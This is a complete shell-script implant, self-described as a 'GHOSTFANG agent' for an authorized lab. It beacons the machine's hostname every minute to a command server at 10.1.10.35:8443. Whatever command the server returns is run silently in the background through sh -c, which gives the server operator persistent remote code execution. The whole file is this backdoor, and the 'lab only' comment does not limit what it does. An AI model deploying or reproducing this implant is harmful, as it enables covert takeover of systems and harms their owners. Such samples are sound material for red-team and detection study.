#!/bin/sh
# GHOSTFANG agent (generated 2026-09-30T19:28:26.993523) — authorized lab only
H=$(hostname 2>/dev/null || echo posix-$(id -u))
while :; do
  R=$(curl -s -m 10 -X POST http://10.1.10.35:8443/r \
       -H 'Content-Type: application/json' \
       -d "{\"host\":\"$H\",\"act\":\"hb\"}" 2>/dev/null)
  C=$(echo "$R" | sed -n 's/.*"cmd":"\([^"]*\)".*/\1/p')
  [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &)
  sleep 60
done
